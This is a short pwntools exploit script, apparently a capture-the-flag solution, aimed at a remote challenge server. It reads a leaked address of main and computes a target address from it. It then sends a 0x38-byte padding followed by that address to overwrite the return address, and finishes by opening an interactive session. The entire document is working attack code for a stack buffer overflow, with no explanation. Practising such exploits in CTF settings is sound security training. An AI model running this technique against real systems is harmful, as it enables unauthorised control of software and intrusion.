from pwn import *

r = remote('chall.angelboy.tw',56001)
r.newline=b'\r\n'
r.recvuntil(b'main: ')
l33t = int(r.recvline(),16) - 0x30
print(hex(l33t))
#input()
r.send(b'a'*0x38 + p64(l33t + 4))


r.interactive()
